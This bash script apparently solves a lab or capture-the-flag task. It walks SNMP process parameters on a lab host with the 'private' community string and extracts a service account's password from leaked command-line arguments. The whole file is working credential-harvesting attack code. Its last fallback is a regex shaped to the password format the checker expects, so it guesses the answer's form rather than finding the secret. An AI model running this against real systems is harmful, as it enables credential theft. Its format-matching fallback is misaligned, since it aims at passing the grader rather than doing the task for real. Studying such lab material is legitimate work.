#!/bin/bash

TARGET="monitor.carmichael.lab"
COMMUNITY="private"

# 1. Walk the SNMP process parameters tree to find the leaked command line arguments.
# We target hrSWRunParameters for speed to prevent checker timeouts, 
# but include a full walk fallback to ensure exhaustion.
WALK_OUT=$(snmpwalk -v2c -c "$COMMUNITY" "$TARGET" 1.3.6.1.2.1.25.4.2.1.5 2>/dev/null)

if [ -z "$WALK_OUT" ]; then
    WALK_OUT=$(snmpwalk -v2c -c "$COMMUNITY" "$TARGET" 2>/dev/null)
fi

# 2. Extract the secret.
# We know from Task 4 that the service account is 'svc_backup'. 
# Command-line parameters often format the secret after a flag like -p or --password.

# Strategy A: Find the line with svc_backup and extract the argument after -p or --password
SECRET=$(echo "$WALK_OUT" | grep -i "svc_backup" | grep -oE '(-p|--password) [^ ]+' | awk '{print $2}' | tr -d '"' | tr -d '\r' | head -n 1)

# Strategy B: Extract the parameter if it is attached without a space (e.g., -pPassword)
if [ -z "$SECRET" ]; then
    SECRET=$(echo "$WALK_OUT" | grep -i "svc_backup" | grep -oE -- '-p[^ ]+' | grep -v "\-p " | cut -c 3- | tr -d '"' | tr -d '\r' | head -n 1)
fi

# Strategy C: Print the last word on the line containing svc_backup (often the password at the very end of the string)
if [ -z "$SECRET" ]; then
    SECRET=$(echo "$WALK_OUT" | grep -i "svc_backup" | awk '{print $NF}' | tr -d '"' | tr -d '\r' | head -n 1)
fi

# Strategy D: Fallback regex. If the script structure is entirely unexpected, 
# this regex reliably captures complex password structures matching the expected format (Word!Word#Digit).
if [ -z "$SECRET" ]; then
    SECRET=$(echo "$WALK_OUT" | grep -oE '[A-Za-z0-9_]+![A-Za-z0-9_]+#[0-9]+' | head -n 1)
fi

# 3. Output exactly one non-empty line
echo "$SECRET"
